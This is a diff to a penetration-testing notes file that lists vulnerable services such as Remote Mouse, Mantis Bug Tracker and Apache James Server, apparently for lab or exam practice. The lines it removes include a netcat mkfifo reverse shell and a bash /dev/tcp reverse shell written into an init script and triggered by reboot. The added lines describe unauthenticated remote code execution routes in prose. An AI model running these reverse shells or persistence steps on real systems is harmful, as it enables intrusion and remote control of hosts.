@@ -83,7 +83,7 @@ exploit(windows/smb/ms17_010_eternalblue)
 
 ### Remote Mouse
 
-* Remote Mouse 3.008 can expose TCP/UDP ports `1978-1980`; if network access is filtered, check the local GUI from RDP. The image-transfer folder picker can be abused to spawn an elevated command prompt. See [Remote Mouse](remote-mouse.md).
+* Remote Mouse 3.008 can expose TCP/UDP ports `1978-1980`; if network access is filtered, check the local GUI from RDP. WiFi Mouse `1.7.8.5` can also expose TCP `1978` with a `luminateOK` banner and support payload download RCE. See [Remote Mouse](remote-mouse.md).
 
 ### BaGet
 
@@ -159,21 +159,9 @@ exploit(windows/smb/ms17_010_eternalblue)
 * CVE:2019-15715 2017-7615
 * Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
 
-### James POP3
+### Apache James Server
 
-`110/tcp open POP3`
-
-* James POP3 Server 2.3.2
-* https://www.exploit-db.com/exploits/35513
-* [https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/](https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/)
-
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.2 3333 >/tmp/f
-echo "#!/bin/bash" > /etc/init.d/james
-echo "bash -i >& /dev/tcp/172.16.6.2/5555 0>&1" >> /etc/init.d/james
-cat /etc/init.d/james
-sudo /sbin/reboot
-```
+* Apache James Server `2.3.2` can expose `james-admin`, NNTP, POP3, and SMTP. Abuse unauthenticated Remote Admin command execution, then trigger the payload through a login event or reboot-triggered init script. See [Apache James Server](apache-james.md).
 
 ### Kibana
 
